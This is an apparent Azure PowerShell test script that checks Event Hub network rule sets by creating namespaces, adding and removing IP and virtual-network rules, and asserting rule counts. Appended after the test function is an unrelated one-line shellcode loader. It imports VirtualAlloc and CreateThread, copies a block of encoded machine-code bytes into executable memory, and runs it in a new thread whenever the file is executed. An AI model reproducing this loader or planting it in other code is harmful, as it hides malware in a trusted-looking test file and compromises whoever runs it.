















function NetworkRuleSetTests
{
    

	$location = Get-Location
	$resourceGroupName = getAssetName "RSG"
	$namespaceName = getAssetName "Eventhub-Namespace-"
	$namespaceName2  = getAssetName "Eventhub-Namespace2-"	
	
    Write-Debug "Create resource group"
	Write-Debug "ResourceGroup name : $resourceGroupName"
	New-AzResourceGroup -Name $resourceGroupName -Location $location -Force	 
	
	

	$checkNameResult = Test-AzEventHubName -Namespace $namespaceName 
	Assert-True {$checkNameResult.NameAvailable}	
     
    Write-Debug " Create new eventHub namespace"
    Write-Debug "NamespaceName : $namespaceName" 
    $result = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -Name $namespaceName -Location $location -SkuName "Standard"
	
	
	Assert-AreEqual $result.ProvisioningState "Succeeded"

    Write-Debug "Get the created namespace within the resource group"
    $createdNamespace = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -Name $namespaceName

    Assert-AreEqual $createdNamespace.Name $namespaceName "Namespace created earlier is not found."	  

	Write-Debug " Create new eventHub namespace"
    Write-Debug "NamespaceName : $namespaceName2" 
    $resultNS = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -Name $namespaceName2 -Location $location -SkuName "Standard"
	
	
	Assert-AreEqual $resultNS.ProvisioningState "Succeeded"

    Write-Debug "Get the created namespace within the resource group"
    $createdNamespace2 = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -Name $namespaceName2
    Assert-AreEqual $createdNamespace2.Name $namespaceName2 "Namespace created earlier is not found."	 
    
    Write-Debug "Add a new IPRule to the default NetworkRuleSet"
    $result =  Add-AzEventHubIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "1.1.1.1" -Action "Allow"

	Write-Debug "Add a new IPRule to the default NetworkRuleSet"
    $result =  Add-AzEventHubIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "2.2.2.2" -Action "Allow"

	Write-Debug "Add a new IPRule to the default NetworkRuleSet"
    $result =  Add-AzEventHubIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "3.3.3.3"

	Write-Debug "Add a new VirtualNetworkRule to the default NetworkRuleSet"
    $result =  Add-AzEventHubVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/default"
	$result =  Add-AzEventHubVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/sbdefault"
	$result =  Add-AzEventHubVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/sbdefault01"

	Write-Debug "Get NetworkRuleSet"
	$getResult1 = Get-AzEventHubNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName
	
	Assert-AreEqual $getResult1.VirtualNetworkRules.Count 3 "VirtualNetworkRules count did not matched"
	Assert-AreEqual $getResult1.IpRules.Count 3 "IPRules count did not matched"

	Write-Debug "Remove a new IPRule to the default NetworkRuleSet"
    $result =  Remove-AzEventHubIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "3.3.3.3"	

	$getResult = Get-AzEventHubNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName

	Assert-AreEqual $getResult.IpRules.Count 2 "IPRules count did not matched after deleting one IPRule"
	Assert-AreEqual $getResult.VirtualNetworkRules.Count 3 "VirtualNetworkRules count did not matched"

	
	$setResult =  Set-AzEventHubNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName2 -InputObject $getResult1
	Assert-AreEqual $setResult.VirtualNetworkRules.Count 3 "Set -VirtualNetworkRules count did not matched"
	Assert-AreEqual $setResult.IpRules.Count 3 "Set - IPRules count did not matched"

	
	$setResult1 =  Set-AzEventHubNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName2 -ResourceId $getResult.Id
	Assert-AreEqual $setResult1.IpRules.Count 2 "Set1 - IPRules count did not matched after deleting one IPRule"
	Assert-AreEqual $setResult1.VirtualNetworkRules.Count 3 "Set1 - VirtualNetworkRules count did not matched"

	Write-Debug "Add a new VirtualNetworkRule to the default NetworkRuleSet"
    $result =  Remove-AzEventHubVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/default"
	
	Write-Debug "Delete NetworkRuleSet"
    $result =  Remove-AzEventHubNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName   

    Write-Debug " Delete namespaces"    
    Remove-AzEventHubNamespace -ResourceGroup $resourceGroupName -Name $namespaceName

	Write-Debug " Delete resourcegroup"
	Remove-AzResourceGroup -Name $resourceGroupName -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xbe,0x70,0x01,0x20,0xb9,0xb1,0x47,0x31,0x72,0x18,0x03,0x72,0x18,0x83,0xea,0x8c,0xe3,0xd5,0x45,0x84,0x66,0x15,0xb6,0x54,0x07,0x9f,0x53,0x65,0x07,0xfb,0x10,0xd5,0xb7,0x8f,0x75,0xd9,0x3c,0xdd,0x6d,0x6a,0x30,0xca,0x82,0xdb,0xff,0x2c,0xac,0xdc,0xac,0x0d,0xaf,0x5e,0xaf,0x41,0x0f,0x5f,0x60,0x94,0x4e,0x98,0x9d,0x55,0x02,0x71,0xe9,0xc8,0xb3,0xf6,0xa7,0xd0,0x38,0x44,0x29,0x51,0xdc,0x1c,0x48,0x70,0x73,0x17,0x13,0x52,0x75,0xf4,0x2f,0xdb,0x6d,0x19,0x15,0x95,0x06,0xe9,0xe1,0x24,0xcf,0x20,0x09,0x8a,0x2e,0x8d,0xf8,0xd2,0x77,0x29,0xe3,0xa0,0x81,0x4a,0x9e,0xb2,0x55,0x31,0x44,0x36,0x4e,0x91,0x0f,0xe0,0xaa,0x20,0xc3,0x77,0x38,0x2e,0xa8,0xfc,0x66,0x32,0x2f,0xd0,0x1c,0x4e,0xa4,0xd7,0xf2,0xc7,0xfe,0xf3,0xd6,0x8c,0xa5,0x9a,0x4f,0x68,0x0b,0xa2,0x90,0xd3,0xf4,0x06,0xda,0xf9,0xe1,0x3a,0x81,0x95,0xc6,0x76,0x3a,0x65,0x41,0x00,0x49,0x57,0xce,0xba,0xc5,0xdb,0x87,0x64,0x11,0x1c,0xb2,0xd1,0x8d,0xe3,0x3d,0x22,0x87,0x27,0x69,0x72,0xbf,0x8e,0x12,0x19,0x3f,0x2f,0xc7,0xb4,0x3a,0xa7,0xa2,0x70,0x97,0xb8,0x5b,0x83,0x17,0xc7,0x26,0x0a,0xf1,0x97,0x08,0x5d,0xae,0x57,0xf9,0x1d,0x1e,0x3f,0x13,0x92,0x41,0x5f,0x1c,0x78,0xea,0xf5,0xf3,0xd5,0x42,0x61,0x6d,0x7c,0x18,0x10,0x72,0xaa,0x64,0x12,0xf8,0x59,0x98,0xdc,0x09,0x17,0x8a,0x88,0xf9,0x62,0xf0,0x1e,0x05,0x59,0x9f,0x9e,0x93,0x66,0x36,0xc9,0x0b,0x65,0x6f,0x3d,0x94,0x96,0x5a,0x36,0x1d,0x03,0x25,0x20,0x62,0xc3,0xa5,0xb0,0x34,0x89,0xa5,0xd8,0xe0,0xe9,0xf5,0xfd,0xee,0x27,0x6a,0xae,0x7a,0xc8,0xdb,0x03,0x2c,0xa0,0xe1,0x7a,0x1a,0x6f,0x19,0xa9,0x9a,0x53,0xcc,0x97,0xe8,0xbd,0xcc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

